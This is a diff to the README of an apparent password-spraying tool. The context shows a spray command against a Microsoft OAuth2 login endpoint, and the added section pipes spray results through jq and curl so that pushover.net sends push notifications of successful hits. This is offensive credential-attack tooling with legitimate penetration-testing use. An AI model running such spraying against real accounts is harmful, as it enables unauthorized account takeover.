@@ -87,3 +87,13 @@ http-spray -t https://login.microsoftonline.com/corp.com/oauth2/token -m msauth 
 > **Note:**
 >
 > The username must be specified as email address, e.g. `john.doe@corp.com`.
+
+### Push Notifications
+
+Integration for [pushover.net](https://pushover.net/).
+
+~~~ bash
+tail -f ./http-spray.json | jq -c 'select(.status!="invalid" and .status!="exists")|del(.user, .password)' | while read -r line; do
+    curl -sSf https://api.pushover.net/1/messages.json -d user=$PUSHOVER_USER -d token=$PUSHOVER_TOKEN --data-urlencode title='Password Spraying' --data-urlencode message="$line"
+done
+~~~
